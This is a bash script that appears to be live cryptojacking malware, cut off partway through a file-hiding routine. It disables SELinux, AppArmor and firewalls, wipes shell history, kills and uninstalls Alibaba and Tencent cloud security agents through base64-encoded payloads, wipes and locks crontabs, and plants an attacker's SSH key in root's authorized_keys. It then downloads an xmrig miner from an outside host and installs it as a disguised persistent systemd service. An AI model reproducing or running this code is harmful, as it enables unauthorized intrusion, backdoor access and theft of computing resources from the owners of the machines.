#!/bin/bash
##variables
domain=93.95.229.203
mainurl=http://$domain/
proxyport=4444

#init environment
m_command()
{
if [ -x /bin/chattr ];then
    cp /bin/chattr /bin/chattr
elif [ -x /usr/bin/chattr ];then
    cp /usr/bin/chattr /usr/bin/chattr
fi
if [ -x /bin/chattr ];then
    export CHATTR=/bin/chattr
elif [ -x /usr/bin/chattr ];then
    export CHATTR=/usr/bin/chattr
else
    export CHATTR=chattr
fi
if [ -f /bin/curl ];then
    export CURL_CMD="/bin/curl"
elif [ -f /usr/bin/curl ];then
    export CURL_CMD="/usr/bin/curl"
fi
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /usr/bin/wget ];then
    export WGET_CMD="/usr/bin/wget"
fi

if [ -x "/usr/bin/wge" -o -x "/bin/wge" ];then
    if [ -f /bin/wge ];then
        export WGET_CMD="/bin/wge"
    elif [ -f /usr/bin/wge ];then
        export WGET_CMD="/usr/bin/wge"
    fi
    mv /bin/wge /bin/wls || mv /usr/bin/wge /usr/bin/wls
fi
if [ -x "/usr/bin/wd1" -o -x "/bin/wd1" ];then
    if [ -f /usr/bin/wd1 ];then
        export WGET_CMD="/usr/bin/wd1"
    elif [ -f /bin/wd1 ];then
        export WGET_CMD="/bin/wd1"
    fi
    cp /bin/wd1 /bin/wls || cp /usr/bin/wd1 /usr/bin/wls 
fi
if [ -x "/usr/bin/wget1" -o -x "/bin/wget1" ];then
    if [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1"
    elif [ -f /usr/bin/wget1 ];then
        export WGET_CMD="/usr/bin/wget1"
    fi
    cp /bin/wget1 /bin/wls || cp /usr/bin/wget1 /usr/bin/wls
fi
if [ -x "/usr/bin/wdt" -o -x "/bin/wdt" ];then
    if [ -f /bin/wdt ];then
        export WGET_CMD="/bin/wdt"
    elif [ -f /usr/bin/wdt ];then
        export WGET_CMD="/usr/bin/wdt"
    fi
    cp /bin/wdt /bin/wls || cp /usr/bin/wdt /usr/bin/wls
fi
if [ -x "/usr/bin/wdz" -o -x "/bin/wdz" ];then
    if [ -f /usr/bin/wdz ];then
        export WGET_CMD="/usr/bin/wdz"
    elif [ -f /bin/wdz ];then
        export WGET_CMD="/bin/wdz"
    fi
    cp /bin/wdz /bin/wls || cp /usr/bin/wdz /usr/bin/wls
fi
if [ -x "/usr/bin/xget" -o -x "bin/xget" ];then
    if [ -f /bin/xget ];then
        export WGET_CMD="/bin/xget"
    elif [ -f /usr/bin/xget ];then
        export WGET_CMD="/usr/bin/xget"
    fi 
    cp /bin/xget /bin/wls || cp /usr/bin/xget /usr/bin/wls
fi 
if [ -x "/bin/wls" ];then
    export WGET_CMD="/bin/wls"
elif [ -x "/usr/bin/wls" ];then
    export WGET_CMD="/usr/bin/wls"
else
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
    cp /bin/wget /bin/wls || cp /usr/bin/wget /usr/bin/wls
    if [ -f /bin/wls ];then
        export WGET_CMD="/bin/wls" 
    elif [ -f /usr/bin/wls ];then
        export WGET_CMD="/usr/bin/wls"
    fi  
fi

if [ -x "/usr/bin/cd1" -o -x "/bin/cd1" ];then
    if [ -f /bin/cd1 ];then
        export CURL_CMD="/bin/cd1"
    elif [ -f /usr/bin/cd1 ];then
        export CURL_CMD="/usr/bin/cd1"
    fi
    cp /bin/cd1 /bin/cls || cp /usr/bin/cd1 /usr/bin/cls
fi
if [ -x "/usr/bin/curl" -o -x "/bin/curl" ];then 
    if [ -f /bin/curl ];then
        export CURL_CMD="/bin/curl"
    elif [ -f /usr/bin/curl ];then
        export CURL_CMD="/usr/bin/curl"
    fi
    cp /bin/curl /bin/cls || cp /usr/bin/curl /usr/bin/cls
fi
if [ -x "/usr/bin/cdz" -o -x "/bin/cdz" ];then
    if [ -f /bin/cdz ];then
        export CURL_CMD="/bin/cdz"
    elif [ -f /usr/bin/cdz ];then
        export CURL_CMD="/usr/bin/cdz"
    fi
    cp /bin/cdz /bin/cls || cp /usr/bin/cdz /usr/bin/cls
fi
if [ -x "/usr/bin/cur" -o -x "/bin/cur" ];then
    if [ -f /bin/cur ];then
        export CURL_CMD="/bin/cur"
    elif [ -f /usr/bin/cur ];then
        export CURL_CMD="/usr/bin/cur"
    fi
    cp /bin/cur /bin/cls || cp /usr/bin/cur /usr/bin/cls
fi
if [ -x "/usr/bin/KALcurl" -o -x "/bin/KALcurl" ];then
    if [ -f /bin/KALcurl ];then
        export CURL_CMD="/bin/KALcurl"
    elif [ -f /usr/bin/KALcurl ];then
        export CURL_CMD="/usr/bin/KALcurl"
    fi
    cp /bin/KALcurl /bin/cls || cp /usr/bin/KALcurl /usr/bin/cls
fi
if [ -x "/usr/bin/curlKAL" -o -x "/bin/curlKAL" ];then
    if [ -f /bin/curlKAL ];then 
        export CURL_CMD="/bin/curlKAL"
    elif [ -f /usr/bin/curltxt ];then
        export CURL_CMD="/usr/bin/curlKAL"
    fi
    cp /bin/curlKAL /bin/cls || cp /usr/bin/curlKAL /usr/bin/cls
fi
if [ -x "/usr/bin/curl1" -o -x "/bin/curl1" ];then
    if [ -f /bin/curl1 ];then
        export CURL_CMD="/bin/curl1"
    elif [ -f /usr/bin/curl1 ];then
        export CURL_CMD="/usr/bin/curl1"
    fi
    cp /bin/curl1 /bin/cls || cp /usr/bin/curl1 /usr/bin/cls
fi
if [ -x "/usr/bin/cdt" -o -x "/bin/cdt" ];then
    if [ -f /bin/cdt ];then
        export CURL_CMD="/bin/cdt"
    elif [ -f /usr/bin/cdt ];then
        export CURL_CMD="/usr/bin/cdt"
    fi
    cp /bin/cdt /bin/cls || cp /usr/bin/cdt /usr/bin/cls
fi
if [ -x "/usr/bin/xcurl" -o -x "/bin/xcurl" ];then
    if [ -f /bin/xcurl ];then
        export CURL_CMD="/bin/xcurl"
    elif [ -f /usr/bin/xcurl ];then
        export CURL_CMD="/usr/bin/xcurl"
    fi
    cp /bin/xcurl /bin/cls || cp /usr/bin/xcurl /usr/bin/wls
fi
if [ -x "/usr/bin/cls" ];then
    export CURL_CMD="/usr/bin/cls"
elif [ -x "/bin/cls" ];then
    export CURL_CMD="/bin/cls"
else
    if [ $(command -v yum) ];then 
        rpm -e --nodeps curl
        yum remove curl
        yum install -y curl  
    else
        apt-get remove curl
        apt-get install -y  curl
    fi
    cp /bin/curl /bin/cls || cp /usr/bin/curl /usr/bin/cls
    if [ -f /bin/cls ];then
        export CURL_CMD="/bin/cls"
    elif [ -f /usr/bin/cls ];then
        export CURL_CMD="/usr/bin/cls"
    fi
fi 
}

yum_ins()
{
	yum clean all
	for pkg in gcc make kmod net-tools "kernel-devel-uname-r == $(uname -r)"
	do
	yum install -y $pkg
	done
}
apk_ins()
{
	apk update
	for pkg in gcc make kmod  linux-headers net-tools
	do
	apk add $pkg
	done	
}
apt_ins()
{
	apt update --fix-missing
	for pkg in gcc make kmod net-tools linux-headers-$(uname -r) linux-headers-generic
	do
	apt-get install -y $pkg
	done	
}
ins_package()
{
	if 
		type apk 2>/dev/null 1>/dev/null;
	then 
		apk_ins
	fi
	if 
		type apt 2>/dev/null 1>/dev/null;
	then 
		apt_ins
	fi
	if 
		type yum 2>/dev/null 1>/dev/null;
	then 
		yum_ins
	fi		
}

check_exist()
{
if [ -x /usr/bin/netstat -o /bin/netstat ]
then
for pt in $(netstat -an|grep EST|grep "$proxyport"|awk '{print $5}'|awk -F ":" '{print $NF}')
do
   if [ "$pt" == "$proxyport" ];then
   echo "miner running"
   exit 1
   else
   echo "miner may not running,check next port"
   fi
done
else
        echo "haha"
fi
}

clean_monitor()
{
iptables -F
ulimit -n 65535 2>/dev/null 1>/dev/null
export LC_ALL=C 
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
shopt -ou history 2>/dev/null 1>/dev/null
set +o history 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
setenforce 0 2>/dev/null 1>/dev/null
echo SELINUX=disabled >/etc/selinux/config 2>/dev/null
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop apparmor 2>/dev/null 1>/dev/null ; systemctl disable apparmor 2>/dev/null 1>/dev/null ; else service apparmor stop 2>/dev/null 1>/dev/null ; fi
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis 2>/dev/null 1>/dev/null ; fi
if type ufw 2>/dev/null 1>/dev/null; then ufw disable 2>/dev/null 1>/dev/null ; fi
if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null 1>/dev/null ; fi
sysctl kernel.nmi_watchdog=0 2>/dev/null 1>/dev/null
if [ -f "/proc/sys/kernel/nmi_watchdog" ]; then echo '0' >/proc/sys/kernel/nmi_watchdog 2>/dev/null ; fi
if [ -f "/etc/sysctl.conf" ]; then echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf 2>/dev/null ; fi
if ps aux | grep -i '[a]liyun' 2>/dev/null 1>/dev/null; then
	  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash 2>/dev/null 1>/dev/null
	    echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash 2>/dev/null 1>/dev/null
	      pkill aliyun-service 2>/dev/null 1>/dev/null
	      if [ -f "/etc/init.d/agentwatch" ]; then rm -rf /etc/init.d/agentwatch 2>/dev/null 1>/dev/null ; fi
	      if [ -f "/usr/sbin/aliyun-service" ]; then rm -fr /usr/sbin/aliyun-service 2>/dev/null 1>/dev/null ; fi
	      if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis* 2>/dev/null 1>/dev/null ; fi
	        if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
		  if type systemctl 2>/dev/null 1>/dev/null; then systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else if [ -f "/etc/init.d/aliyun" ]; then rm -fr /etc/init.d/aliyun 2>/dev/null 1>/dev/null ; fi ; fi
		    if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop bcm-agent 2>/dev/null 1>/dev/null ; else service bcm-agent stop 2>/dev/null 1>/dev/null ; fi
		      if type yum 2>/dev/null 1>/dev/null; then yum remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
		        if type apt-get 2>/dev/null 1>/dev/null; then apt-get remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
		elif ps aux | grep -i '[y]unjing' 2>/dev/null 1>/dev/null; then
			if [ -f "/usr/local/qcloud/stargate/admin/uninstall.sh" ]; then /usr/local/qcloud/stargate/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
			if [ -f "/usr/local/qcloud/YunJing/uninst.sh" ]; then /usr/local/qcloud/YunJing/uninst.sh 2>/dev/null 1>/dev/null ; fi
			if [ -f "/usr/local/qcloud/monitor/barad/admin/uninstall.sh" ]; then /usr/local/qcloud/monitor/barad/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
fi
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf

if ps aux | grep -i '[a]liyun'; then
  ${CURL_CMD} http://update.aegis.aliyun.com/download/uninstall.sh | bash
  ${CURL_CMD} http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor	
else
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 stop && /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 uninstall && rm -rf /usr/local/cloudmonitor	
  else
    echo "ali cloud monitor not running"
  fi
fi
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
}

function SetupNameServers(){	
grep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; kalrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null; kalrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
grep -q 8.8.4.4 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; kalrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null; kalrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
}

clmo() {
if ps aux | grep -i '[a]liyun'; then
echo "this is ali cloud"
number=$(ps -ef|grep -i dun|grep -v grep|wc -l)
until [ "$number" -eq 0 ]; do
systemctl stop aliyun
systemctl stop aegis
ps -ef|grep -i aegis|awk '{print $2}'|xargs kill -HUP
number=$(ps -ef|grep -i dun|grep -v grep|wc -l)
done

while  [ -d /usr/local/aegis ]
do 
ps -ef|grep -i AliSecGuard|grep -v grep |awk '{print $2}'|xargs kill -HUP 
path=$(ps -ef|grep AliSecGuard|grep -v grep|awk '{print $NF}')
num=$(ps -ef|grep AliSecGuard|grep -v grep|awk '{print $NF}'|wc -l)
if [ $num -gt 0 ]
then 
echo "$path" exist
$path --stopdriver
else
echo "no AliSecGuard process"
fi
rm -rf /usr/local/aegis
done
else 
echo "it's not ali cloud"
fi
}
function clean_cron(){
	${CHATTR} -R -ia /var/spool/cron
	kalrecht -R -ia /var/spool/cron
	${CHATTR} -ia /etc/crontab
	kalrecht -ia /etc/crontab
	${CHATTR} -R -ia /etc/cron.d
	kalrecht -R -ia /etc/cron.d
	${CHATTR} -R -ia /var/spool/cron/crontabs
	kalrecht -R -ia /var/spool/cron/crontabs
	crontab -r
	rm -rf /var/spool/cron/*
	rm -rf /etc/cron.d/*
	rm -rf /var/spool/cron/crontabs
	rm -rf /etc/crontab
}
function lock_cron()
{
	${CHATTR} -R +ia /var/spool/cron
	touch /etc/crontab
	${CHATTR} +ia /etc/crontab
	${CHATTR} -R +ia /var/spool/cron/crontabs
	${CHATTR} -R +ia /etc/cron.d
}
function makesshaxx(){
	echo "begin makessh"
	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKc7WyORh/crpiuF7QFAOH7eltKLYcTb2VrFnAoMnTXTLLmC+mNXkXogQKZ2nwMQRYjbOlZZEx2EwBc84HEiUiBfzqJ2PGl6uCwFLabIlkhjWq3jGSzwYj/3PU2iQJLDiJdM98bHwUgYQ+kqXuoxv9GNrjSe85IouPe08FJh7B7RDKGLdTTomBxSKv4ZCNSZgB2V+Yq0BuVUZLxRQRjpeJr9EyHIo0/s7YhR65ns1mRxxleJvQrGjiPv8LsuUO8p/DjKg7H0Bp5Qpg3YuFhVMMrF2qytnMQp6bLF/2dAsDft3P17RO0vjDHl8W1c4zhegjqN6IzejQi0FuVL3bB3QJ3iRWCIQdcYXzEnxs7T12uPLEk5hZlKSn0Ewx4HLrx7u/z5bmh7BxaOw8SeTTiVc+HqA9QBPOjF6I14MCEcI5NsL9q0Mxrc0yfEubfqqTygkESZh4IhGGft5VNlzfyf7OruIs+KHG5F877a/wWstt+N1/T3ieVO1jfEYHzUbBxck= kc@kc-ms7976"

	mkdir /root/.ssh/ -p  
	touch /root/.ssh/authorized_keys  
	touch /root/.ssh/authorized_keys2
	chmod 600 /root/.ssh/authorized_keys
	chmod 600 /root/.ssh/authorized_keys2
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys || ${CHATTR} -ia /root/.ssh/authorized_keys; 
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys || kalrecht -ia /root/.ssh/authorized_keys; 
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; ${CHATTR} +ia /root/.ssh/authorized_keys; kalrecht +ia /root/.ssh/authorized_keys
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys2 || ${CHATTR} -ia /root/.ssh/authorized_keys2; 
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys2 || kalrecht -ia /root/.ssh/authorized_keys2; 
	grep -q kc@kc-ms7976 /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; ${CHATTR} +ia /root/.ssh/authorized_keys2; kalrecht +ia /root/.ssh/authorized_keys2
}
download_f(){
config_url=http://whatwill.be/config.json
miner_url=http://whatwill.be/x.tar
export MOHOME="/usr/share"
cd ${MOHOME} 
${WGET_CMD} --tries=3 --timeout=10 -O ${MOHOME}/md.pid ${config_url}
echo ${config_url}
if [ -f ${MOHOME}/md ];then
    echo "miner file exists"
else
    ${WGET_CMD} --tries=10 --timeout=10 -O ${MOHOME}/crypto  ${miner_url}
    if [ $? -ne 0 ];then
        ${WGET_CMD} --tries=2 --timeout=10 -O ${MOHOME}/crypto ${miner_url_backup}
    fi 
    if tar -xf "${MOHOME}/crypto" -C ${MOHOME};then
        mv ${MOHOME}/xmrig  ${MOHOME}/md  
        chmod a+x ${MOHOME}/md
        rm -rf ${MOHOME}/xmrig*
    fi
fi
}
setup_s(){
grep -q md /etc/systemd/system/md.service
if [ $? -eq 0 ]
then 
	echo service exist
else
	rm -f /etc/systemd/system/md.service
cat << EOLB >/tmp/ext4.service 
[Unit]
Description=crypto system service
After=network.target
[Service]
Type=forking
GuessMainPID=no
ExecStart=${MOHOME}/md --config=${MOHOME}/md.pid
WorkingDirectory=${MOHOME}
Restart=always
Nice=0 
RestartSec=3
[Install]
WantedBy=multi-user.target
EOLB
fi
mv /tmp/ext4.service /etc/systemd/system/md.service 
systemctl daemon-reload
systemctl start md
systemctl enable md
}
exec_f(){
  for nhid in $(ps aux | grep -v grep | grep '/usr/share/md\|masscan' | awk '{print $2}')
   do
     kill -31  $nhid
   done
}

hide_f(){
if [ -d "/usr/src/kernels/$(uname -r)/lib" ]
then 
  hi_home=${MOHOME}/...
  mkdir -p $hi_home
  if [ ! -d "$hi_home" ]; then mkdir -p $hi_home ; fi
